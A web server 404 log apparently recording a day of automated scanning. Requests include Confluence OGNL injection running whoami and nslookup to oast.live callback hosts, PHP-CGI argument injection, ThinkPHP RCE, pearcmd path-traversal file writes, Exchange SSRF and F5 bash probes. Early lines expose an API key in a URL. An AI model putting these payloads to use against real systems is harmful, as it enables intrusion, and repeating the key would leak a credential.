[2026-02-18 15:09:50] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:09:50] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:09:51] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:09:51] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:09:52] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:09:52] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:10:33] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:10:33] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:10:54] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:11:10] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:11:11] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:11:22] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:11:23] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:11:34] 404 - Method: HEAD - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:11:47] 404 - Method: GET - URI: /v1/launch.php?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:12:03] 404 - Method: GET - URI: /api/v1/launch.php?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:12:19] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:12:19] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:14:01] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:15:20] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:15:20] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:15:50] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:16:30] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:16:30] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:16:59] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:16:59] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:17:37] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:17:37] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:17:56] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:17:56] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:19:32] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:19:32] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:19:46] 404 - Method: HEAD - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:19:46] 404 - Method: GET - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:35:26] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 15:35:44] 404 - Method: HEAD - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 15:35:47] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 15:35:47] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-18 15:35:47] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-18 15:41:55] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 15:41:55] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-18 15:41:55] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-18 15:42:20] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 15:44:50] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 15:57:53] 404 - Method: GET - URI: /cgi-bin/luci/;stok=/locale - Matched Path: /cgi-bin/luci/;stok=/locale
[2026-02-18 16:01:58] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:11:19] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:12:58] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:13:05] 404 - Method: POST - URI: /webtools/control/main/ProgramExport - Matched Path: /webtools/control/main/ProgramExport
[2026-02-18 16:13:06] 404 - Method: POST - URI: /developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1 - Matched Path: /developmentserver/metadatauploader
[2026-02-18 16:13:15] 404 - Method: HEAD - URI: /v1/launch?api_key=inf_86f8430f92b8a2080b0798a40c09f446&user_id=23213&game_uid=3978 - Matched Path: /502.html
[2026-02-18 16:13:20] 404 - Method: POST - URI: /pages/createpage-entervariables.action - Matched Path: /pages/createpage-entervariables.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /wiki/pages/createpage-entervariables.action?SpaceKey=x - Matched Path: /wiki/pages/createpage-entervariables.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /pages/createpage-entervariables.action - Matched Path: /pages/createpage-entervariables.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /pages/createpage.action?spaceKey=myproj - Matched Path: /pages/createpage.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /wiki/pages/createpage-entervariables.action - Matched Path: /wiki/pages/createpage-entervariables.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /pages/doenterpagevariables.action - Matched Path: /pages/doenterpagevariables.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /templates/editor-preload-container - Matched Path: /templates/editor-preload-container
[2026-02-18 16:13:20] 404 - Method: POST - URI: /pages/templates2/viewpagetemplate.action - Matched Path: /pages/templates2/viewpagetemplate.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /users/user-dark-features - Matched Path: /users/user-dark-features
[2026-02-18 16:13:20] 404 - Method: POST - URI: /template/custom/content-editor - Matched Path: /template/custom/content-editor
[2026-02-18 16:13:20] 404 - Method: POST - URI: /confluence/pages/createpage-entervariables.action?SpaceKey=x - Matched Path: /confluence/pages/createpage-entervariables.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /pages/createpage-entervariables.action?SpaceKey=x - Matched Path: /pages/createpage-entervariables.action
[2026-02-18 16:13:20] 404 - Method: POST - URI: /confluence/pages/createpage-entervariables.action - Matched Path: /confluence/pages/createpage-entervariables.action
[2026-02-18 16:13:45] 404 - Method: GET - URI: /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=0726 - Matched Path: /WebInterface/function
[2026-02-18 16:13:49] 404 - Method: GET - URI: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ - Matched Path: /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
[2026-02-18 16:13:51] 404 - Method: POST - URI: /mgmt/tm/util/bash - Matched Path: /mgmt/tm/util/bash
[2026-02-18 16:13:51] 404 - Method: GET - URI: /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com - Matched Path: /autodiscover/autodiscover.json
[2026-02-18 16:14:03] 404 - Method: GET - URI: /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=0726 - Matched Path: /WebInterface/function
[2026-02-18 16:14:08] 404 - Method: GET - URI: /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d6an8qh9gkqag0ce2jfgy7qbagjywpj5k.oast.live%22%29%7D/ - Matched Path: /${@java.lang.Runtime@getRuntime().exec("nslookup d6an8qh9gkqag0ce2jfgy7qbagjywpj5k.oast.live")}
[2026-02-18 16:14:10] 404 - Method: POST - URI: /mgmt/tm/util/bash - Matched Path: /mgmt/tm/util/bash
[2026-02-18 16:14:10] 404 - Method: GET - URI: /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com - Matched Path: /autodiscover/autodiscover.json
[2026-02-18 16:15:36] 404 - Method: POST - URI: /webtools/control/main/ProgramExport - Matched Path: /webtools/control/main/ProgramExport
[2026-02-18 16:15:36] 404 - Method: POST - URI: /developmentserver/metadatauploader?CONTENTTYPE=MODEL&CLIENT=1 - Matched Path: /developmentserver/metadatauploader
[2026-02-18 16:15:49] 404 - Method: POST - URI: /pages/createpage-entervariables.action?SpaceKey=x - Matched Path: /pages/createpage-entervariables.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /pages/createpage.action?spaceKey=myproj - Matched Path: /pages/createpage.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /wiki/pages/createpage-entervariables.action - Matched Path: /wiki/pages/createpage-entervariables.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /confluence/pages/createpage-entervariables.action - Matched Path: /confluence/pages/createpage-entervariables.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /template/custom/content-editor - Matched Path: /template/custom/content-editor
[2026-02-18 16:15:49] 404 - Method: POST - URI: /pages/createpage-entervariables.action - Matched Path: /pages/createpage-entervariables.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /pages/doenterpagevariables.action - Matched Path: /pages/doenterpagevariables.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /templates/editor-preload-container - Matched Path: /templates/editor-preload-container
[2026-02-18 16:15:49] 404 - Method: POST - URI: /wiki/pages/createpage-entervariables.action?SpaceKey=x - Matched Path: /wiki/pages/createpage-entervariables.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /confluence/pages/createpage-entervariables.action?SpaceKey=x - Matched Path: /confluence/pages/createpage-entervariables.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /pages/templates2/viewpagetemplate.action - Matched Path: /pages/templates2/viewpagetemplate.action
[2026-02-18 16:15:49] 404 - Method: POST - URI: /users/user-dark-features - Matched Path: /users/user-dark-features
[2026-02-18 16:15:49] 404 - Method: POST - URI: /pages/createpage-entervariables.action - Matched Path: /pages/createpage-entervariables.action
[2026-02-18 16:16:15] 404 - Method: GET - URI: /setup/setupadministrator-start.action - Matched Path: /setup/setupadministrator-start.action
[2026-02-18 16:16:15] 404 - Method: POST - URI: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /hello.world
[2026-02-18 16:16:15] 404 - Method: POST - URI: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /
[2026-02-18 16:16:33] 404 - Method: GET - URI: /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache39poPAaPVdV288JHMvzn5tF3jC8 - Matched Path: /server-info.action
[2026-02-18 16:16:39] 404 - Method: GET - URI: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello - Matched Path: /index/\think\app/invokefunction
[2026-02-18 16:16:41] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php - Matched Path: /index.php
[2026-02-18 16:16:41] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../tmp/index1 - Matched Path: /index.php
[2026-02-18 16:16:42] 404 - Method: GET - URI: /containers/json - Matched Path: /containers/json
[2026-02-18 16:16:48] 404 - Method: GET - URI: /setup/setupadministrator-start.action - Matched Path: /setup/setupadministrator-start.action
[2026-02-18 16:16:54] 404 - Method: POST - URI: /setup/setupadministrator.action - Matched Path: /setup/setupadministrator.action
[2026-02-18 16:16:58] 404 - Method: POST - URI: /dologin.action - Matched Path: /dologin.action
[2026-02-18 16:17:02] 404 - Method: GET - URI: /welcome.action - Matched Path: /welcome.action
[2026-02-18 16:17:18] 404 - Method: GET - URI: /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=0726 - Matched Path: /WebInterface/function
[2026-02-18 16:17:19] 404 - Method: POST - URI: /mgmt/tm/util/bash - Matched Path: /mgmt/tm/util/bash
[2026-02-18 16:17:20] 404 - Method: GET - URI: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ - Matched Path: /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
[2026-02-18 16:17:20] 404 - Method: GET - URI: /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com - Matched Path: /autodiscover/autodiscover.json
[2026-02-18 16:17:23] 404 - Method: GET - URI: /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=0726 - Matched Path: /WebInterface/function
[2026-02-18 16:17:23] 404 - Method: POST - URI: /mgmt/tm/util/bash - Matched Path: /mgmt/tm/util/bash
[2026-02-18 16:17:24] 404 - Method: GET - URI: /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com - Matched Path: /autodiscover/autodiscover.json
[2026-02-18 16:17:24] 404 - Method: GET - URI: /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d6an8qh9gkqag0ce2jfgrp6rgqc937nqi.oast.live%22%29%7D/ - Matched Path: /${@java.lang.Runtime@getRuntime().exec("nslookup d6an8qh9gkqag0ce2jfgrp6rgqc937nqi.oast.live")}
[2026-02-18 16:18:26] 404 - Method: GET - URI: /setup/setupadministrator-start.action - Matched Path: /setup/setupadministrator-start.action
[2026-02-18 16:18:27] 404 - Method: GET - URI: /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache39poPAaPVdV288JHMvzn5tF3jC8 - Matched Path: /server-info.action
[2026-02-18 16:18:27] 404 - Method: GET - URI: /setup/setupadministrator-start.action - Matched Path: /setup/setupadministrator-start.action
[2026-02-18 16:18:28] 404 - Method: POST - URI: /setup/setupadministrator.action - Matched Path: /setup/setupadministrator.action
[2026-02-18 16:18:29] 404 - Method: POST - URI: /dologin.action - Matched Path: /dologin.action
[2026-02-18 16:18:29] 404 - Method: GET - URI: /welcome.action - Matched Path: /welcome.action
[2026-02-18 16:19:46] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:23:26] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 16:25:44] 404 - Method: HEAD - URI: /master/clients - Matched Path: /master/clients
[2026-02-18 16:27:07] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:27:12] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-18 16:39:26] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:42:05] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:42:52] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:43:37] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 16:44:31] 404 - Method: HEAD - URI: /master/clients - Matched Path: /master/clients
[2026-02-18 16:52:41] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 16:53:06] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:01:43] 404 - Method: HEAD - URI: / - Matched Path: /
[2026-02-18 17:06:06] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:08:09] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 17:08:09] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 17:08:09] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-18 17:08:09] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-18 17:08:09] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-18 17:08:10] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-18 17:08:14] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:08:16] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:08:39] 404 - Method: HEAD - URI: /docs - Matched Path: /docs
[2026-02-18 17:09:08] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:09:09] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:29:06] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:31:35] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:33:53] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 17:52:04] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 17:52:06] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-18 18:01:42] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 18:08:41] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 18:09:26] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 18:09:26] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-18 18:29:46] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 18:33:20] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 18:55:11] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 19:33:09] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 20:05:29] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 20:05:29] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-18 20:05:29] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-18 20:45:22] 404 - Method: GET - URI: /cgi-bin/luci/;stok=/locale - Matched Path: /cgi-bin/luci/;stok=/locale
[2026-02-18 20:47:54] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 21:11:21] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 21:16:23] 404 - Method: GET - URI: /actuator/gateway/routes - Matched Path: /actuator/gateway/routes
[2026-02-18 21:37:08] 404 - Method: POST - URI: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /hello.world
[2026-02-18 21:37:08] 404 - Method: POST - URI: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /
[2026-02-18 21:37:15] 404 - Method: GET - URI: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello - Matched Path: /index/\think\app/invokefunction
[2026-02-18 21:37:16] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php - Matched Path: /index.php
[2026-02-18 21:37:16] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../tmp/index1 - Matched Path: /index.php
[2026-02-18 21:37:17] 404 - Method: GET - URI: /containers/json - Matched Path: /containers/json
[2026-02-18 21:49:59] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 21:51:37] 404 - Method: POST - URI: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /hello.world
[2026-02-18 21:51:38] 404 - Method: POST - URI: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /
[2026-02-18 21:51:55] 404 - Method: GET - URI: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello - Matched Path: /index/\think\app/invokefunction
[2026-02-18 21:51:56] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php - Matched Path: /index.php
[2026-02-18 21:51:57] 404 - Method: GET - URI: /index.php?lang=../../../../../../../../tmp/index1 - Matched Path: /index.php
[2026-02-18 21:51:57] 404 - Method: GET - URI: /containers/json - Matched Path: /containers/json
[2026-02-18 22:14:26] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-18 22:14:26] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-18 22:21:10] 404 - Method: GET - URI: /cgi-bin/luci/;stok=/locale - Matched Path: /cgi-bin/luci/;stok=/locale
[2026-02-18 22:24:52] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 22:25:01] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-18 22:55:21] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-18 23:48:00] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 00:06:56] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 00:06:56] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 00:06:56] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 00:30:59] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 00:32:18] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 00:32:19] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 00:32:19] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 01:17:47] 404 - Method: GET - URI: /dispatch.asp - Matched Path: /dispatch.asp
[2026-02-19 01:28:23] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 01:42:56] 404 - Method: POST - URI: /ajax - Matched Path: /ajax
[2026-02-19 01:54:13] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 01:54:14] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-19 02:07:11] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 02:08:06] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 02:19:03] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 02:23:31] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 02:23:40] 404 - Method: GET - URI: /master_admin - Matched Path: /master_admin
[2026-02-19 02:23:41] 404 - Method: GET - URI: /master/admin - Matched Path: /master/admin
[2026-02-19 02:23:45] 404 - Method: GET - URI: /master-admin - Matched Path: /master-admin
[2026-02-19 02:23:53] 404 - Method: GET - URI: /admin - Matched Path: /admin
[2026-02-19 02:24:04] 404 - Method: GET - URI: /master_admin - Matched Path: /master_admin
[2026-02-19 02:24:27] 404 - Method: GET - URI: /master-admin - Matched Path: /master-admin
[2026-02-19 02:24:39] 404 - Method: GET - URI: /admin-master - Matched Path: /admin-master
[2026-02-19 02:24:47] 404 - Method: GET - URI: /master/admin - Matched Path: /master/admin
[2026-02-19 02:24:50] 404 - Method: GET - URI: /master/admin - Matched Path: /master/admin
[2026-02-19 02:24:50] 404 - Method: GET - URI: /master/admin - Matched Path: /master/admin
[2026-02-19 02:24:51] 404 - Method: GET - URI: /master/admin - Matched Path: /master/admin
[2026-02-19 02:24:51] 404 - Method: GET - URI: /master/admin - Matched Path: /master/admin
[2026-02-19 02:25:51] 404 - Method: GET - URI: /master/admin - Matched Path: /master/admin
[2026-02-19 02:27:45] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 03:05:33] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 03:45:10] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-19 03:46:03] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 03:49:58] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 03:56:43] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 04:29:39] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 04:32:18] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 04:32:18] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 04:32:19] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 04:43:32] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-19 05:02:43] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 05:02:44] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 05:02:44] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 05:06:03] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 05:06:03] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 05:07:08] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 05:23:29] 404 - Method: GET - URI: /actuator/gateway/routes - Matched Path: /actuator/gateway/routes
[2026-02-19 05:28:48] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 06:29:34] 404 - Method: GET - URI: /robots.txt - Matched Path: /robots.txt
[2026-02-19 06:29:48] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 06:32:55] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 06:42:38] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 07:17:20] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 07:19:49] 404 - Method: GET - URI: /cgi-bin/luci/;stok=/locale - Matched Path: /cgi-bin/luci/;stok=/locale
[2026-02-19 07:41:40] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 07:46:12] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 07:48:34] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 07:49:28] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 07:49:28] 404 - Method: POST - URI: /index.php - Matched Path: /index.php
[2026-02-19 07:49:28] 404 - Method: POST - URI: /admin - Matched Path: /admin
[2026-02-19 08:04:12] 404 - Method: GET - URI: /webui/ - Matched Path: /webui
[2026-02-19 08:08:35] 404 - Method: GET - URI: /favicon.ico - Matched Path: /favicon.ico
[2026-02-19 08:09:36] 404 - Method: GET - URI: /geoserver/web/ - Matched Path: /geoserver/web
[2026-02-19 08:33:34] 404 - Method: POST - URI: / - Matched Path: /
[2026-02-19 08:58:55] 404 - Method: GET - URI: /cgi-bin/luci/;stok=/locale - Matched Path: /cgi-bin/luci/;stok=/locale
[2026-02-19 08:59:35] 404 - Method: POST - URI: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /hello.world
[2026-02-19 08:59:35] 404 - Method: POST - URI: /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input - Matched Path: /
[2026-02-19 08:59:42] 404 - Method: GET - URI: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello - Matched Path: /index/\think\app/invokefunction
